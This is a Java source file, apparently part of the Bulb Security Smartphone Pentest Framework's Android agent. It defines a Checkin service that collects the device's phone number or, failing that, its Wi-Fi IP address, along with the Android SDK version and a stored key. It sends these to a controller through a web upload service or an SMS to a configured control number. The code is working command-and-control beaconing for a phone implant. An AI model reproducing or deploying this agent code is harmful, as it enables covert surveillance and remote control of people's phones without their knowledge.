package com.bulbsecurity.framework;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.os.Build;

public class Checkin extends Service {

	

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		
	}
	
	@Override
	public void onStart(Intent intent, int startID) {
		String sms = "SMS";
		String web = "WEB";
		String ret = intent.getStringExtra("returnmethod");
		Log.i("AAA", "Started attach");	
		Context context = getApplicationContext();
		//String key = ((AndroidAgent)this.getApplication()).getkey();
		//String controlnumber = ((AndroidAgent) this.getApplication()).getcontrolNumber();
		String key = getApplicationContext().getResources().getString(R.string.key);
		String controlnumber = getApplicationContext().getResources().getString(R.string.controlnumber);
		TelephonyManager num = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		String number = num.getLine1Number();
		if (number.equals(""))
		{
			ConnectivityManager connManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
			NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

			if (mWifi.isConnected()) {
			WifiManager myWifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
			WifiInfo myWifiInfo = myWifiManager.getConnectionInfo();
			int ip = myWifiInfo.getIpAddress();
			 String ipString = String.format("%d.%d.%d.%d",(ip & 0xff),(ip >> 8 & 0xff),(ip >> 16 & 0xff),(ip >> 24 & 0xff));
			 number = ipString;
			}
		
		}
         	int version1 = Build.VERSION.SDK_INT;
		String version = Integer.toString(version1);
	String facts = key + "," + number + ",Android," + controlnumber + "," + version;
	if (ret.equals(web)){
	Intent intent2 = new Intent(getApplicationContext(), WebUploadService.class);
	intent2.putExtra("uploadstring",facts );
	
	context.startService(intent2);
	}
		if (ret.equals(sms))
			{

		        	String facts2 = key.concat(" ").concat(facts);
				Intent intent3 = new Intent(getApplicationContext(),SMSService.class);
				//String number2 = ((AndroidAgent)this.getApplication()).getcontrolNumber();
				//String key = ((AndroidAgent)this.getApplication()).getkey();
				String number2 = getApplicationContext().getResources().getString(R.string.controlnumber);
				intent3.putExtra("number", number2);
				intent3.putExtra("message", facts2);
				context.startService(intent3);
				
			}

	}
}
